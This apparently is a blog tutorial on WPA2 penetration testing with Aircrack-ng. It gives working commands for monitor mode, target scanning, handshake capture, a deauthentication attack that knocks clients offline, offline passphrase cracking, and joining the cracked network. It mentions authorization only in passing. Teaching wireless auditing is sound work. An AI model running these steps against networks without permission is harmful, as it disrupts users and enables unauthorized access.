+++
title = "Breaking the Handshake: A Technical Guide to WPA2 Penetration Testing"
date = "2026-03-29"
draft = false
description = "A deep dive into the technical process of capturing WPA2 handshakes and performing offline brute-force attacks using the Aircrack-ng suite."
+++

Wireless security is often the "soft underbelly" of an organization's perimeter. While WPA2-AES is robust, its Achilles' heel is the 4-way handshake—the process where a client and an Access Point (AP) prove they know the password without actually sending it over the air.

In this guide, we break down the exact commands used to capture this handshake and crack a default WPA2 passphrase using the Aircrack-ng suite.

---

## Phase 1: Environment Setup
Before starting, ensure your wireless interface is recognized. Most Kali Linux distributions will label this as `wlan0`.

### Check Interface
```bash
iwconfig
```
This identifies your wireless card and confirms it is currently in "Managed" mode.

### Enable Monitor Mode
To capture packets that aren't addressed to your machine, you must put the card into Monitor Mode.

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```
> [!NOTE]
> `check kill` stops background processes (like NetworkManager) that might interfere with the wireless card's state.

---

## Phase 2: Reconnaissance
Now, we look for targets. We need to find the BSSID (MAC address of the router) and the Channel it is broadcasting on.

### Scan the Airwaves
```bash
sudo airodump-ng wlan0mon
```
If you are looking for 5GHz networks specifically, use the band flag:
```bash
sudo airodump-ng --band abg wlan0mon
```

---

## Phase 3: Targeted Capture
Once the target (e.g., "Home_Router") is identified, focus the capture on that specific BSSID and channel to capture the `.cap` file containing the handshake.

### Focus Capture
```bash
sudo airodump-ng -c [channel] --bssid [MAC_ADDRESS] -w capture_file wlan0mon
```
Keep this terminal window open. You are waiting for the top right of the screen to display: `WPA Handshake: [BSSID]`.

---

## Phase 4: The Deauthentication Attack (Optional)
If a client is already connected but you don't want to wait for them to leave and return, you can force a reconnection by sending "Deauth" packets.

Open a new terminal tab:
```bash
sudo aireplay-ng -0 5 -a [BSSID] -c [CLIENT_MAC] wlan0mon
```
*   `-0`: Specifies a Deauth attack.
*   `5`: The number of deauth packets to send.
*   `-c`: The MAC address of a specific device currently connected to the router.

---

## Phase 5: Cracking the Passphrase
Now that you have the `capture_file-01.cap`, you can move to an offline brute-force attack. This compares the mathematical hash of the handshake against a list of potential passwords.

### Using a Default PIN Wordlist
Many routers use a standard 8-digit numeric PIN. You can use a pre-generated list of all possible 8-digit combinations (00000000-99999999).

```bash
aircrack-ng -w /path/to/wordlist.txt -b [BSSID] capture_file-01.cap
```

---

## Phase 6: Connecting to a WiFi Network
Once you have the passphrase (and if you are performing a legal audit), you can connect to the target network using the command line. This is often necessary when working in a headless Linux environment.

### Creating the Configuration File
You can create a `wifi.conf` file (often named `wpa_supplicant.conf`) to store the network credentials securely.

**Sample `wifi.conf`:**
```bash
network={
    ssid="Target_SSID"
    psk="The_Cracked_Passphrase"
    key_mgmt=WPA-PSK
}
```

### Using `wpa_supplicant` to Connect
With the configuration file ready, use the `wpa_supplicant` tool to initiate the connection.

```bash
sudo wpa_supplicant -B -i wlan0 -c wifi.conf
```
*   `-B`: Runs the process in the background (Daemon mode).
*   `-i`: Specifies the wireless interface.
*   `-c`: Points to your configuration file.

### Obtaining an IP Address
After the handshake completes and you are authenticated, you still need an IP address from the network's DHCP server:
```bash
sudo dhclient wlan0
```

---

## Critical Security Takeaways
1.  **Default Credentials are Lethal**: An 8-digit numeric PIN (100 million combinations) can be cracked in minutes on modern hardware.
2.  **Monitor Mode Visibility**: Any data sent over the air is "visible" to anyone nearby with a $30 wireless adapter; encryption is the only thing standing between your data and an attacker.
3.  **Physical Security Matters**: The "Key" to the digital castle is often printed on a sticker on the physical router.